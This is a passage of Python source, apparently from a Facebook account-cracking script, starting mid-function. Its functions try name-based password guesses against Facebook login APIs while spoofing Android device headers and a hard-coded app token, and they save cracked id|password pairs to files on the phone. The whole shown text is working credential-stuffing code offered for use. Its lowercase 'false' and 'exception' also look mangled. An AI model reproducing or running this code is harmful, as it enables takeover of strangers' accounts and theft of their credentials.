                                        open('/sdcard/aking-ok.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [hina-cp] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/aking-cp.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.connectionerror:
                        time.sleep(10)
                except exception as e:
                        pass
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [hina] %s|\033[1;32mok:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                        for pw in passlist:
                                pas = pw.replace('first',fn.lower()).replace('first',fn).replace('last',ln.lower()).replace('last',ln).replace('name',names).replace('name',names.lower())
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'davik/2.1.0 (linux; u; android {str(android_version)}.0.0; {str(gtt)} build/{str(gttt)} [fban/fb4a;fbav/{str(application_version)};fbbv/{str(application_version_code)};fbdm/'+'{density=2.0,width=720,height=1280};'+f'fblc/es_cu;fbrv/{str(application_version_code)};fbcr/movistar;fbmf/samsung;fbbd/samsung;fbpn/{str(fbs)};fbdv/{str(gtt)};fbsv/7.0;fbop/1;fbca/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"es_cu","client_country_code":"cu",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'authorization':'oauth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'excellent',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'liger'}
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                po = requests.post(url,data=data,headers=head,allow_redirects=false).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [hina-cp] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/aking-ok.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [hina-cp] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/aking-cp.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/aking-cp.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.connectionerror:
                        time.sleep(10)
                except exception as e:
                        pass
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [hina] %s|\033[1;32mok:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                gtt=random.choice(xxxxx)
                                gttt=random.choice(xxxxx)
                                android_version=str(random.randrange(6,13))
                                ua_string = f'davik/2.1.0 (linux; u; android {str(android_version)}.0.0; {str(gtt)} build/{str(gttt)} [fban/fb4a;fbav/{str(application_version)};fbbv/{str(application_version_code)};fbdm/'+'{density=2.0,width=720,height=1280};'+f'fblc/en_us;fbrv/{str(application_version_code)};fbcr/movistar;fbmf/samsung;fbbd/samsung;fbpn/{str(fbs)};fbdv/{str(gtt)};fbsv/7.0;fbop/1;fbca/armeabi-v7a:armeabi;]'
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'source':'login','format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "locale":"en_us","client_country_code":"us",
                                        'device':gtt,
                                        'device_id':adid,
                                        "method": "auth.login",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.fb4aauthhandler"}
                                head = {
                                        'content-type':'application/x-www-form-urlencoded',
                                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-type':'unknown',
                                        'authorization':'oauth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                                        'user-agent':ua_string,
                                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                                        'x-fb-connection-quality':'excellent',
                                        'x-fb-friendly-name':'authenticate',
                                        'accept-encoding':'gzip, deflate',
                                        'x-fb-http-engine':     'liger'}
                                url = 'https://b-api.facebook.com/method/auth.login'
                                po = requests.post(url,data=data,headers=head,allow_redirects=false).text
                                q = json.loads(po)
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/aking-ok.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [hina-ok] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/aking-ok.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [hina-ok] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/aking-ok.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.connectionerror:
                        time.sleep(10)
                except exception as e:
                        pass
                        
try:
        menu()
except requests.exceptions.connectionerror:
        print('\n no internet connection ...')
        exit()
except exception as e:pass
menu()
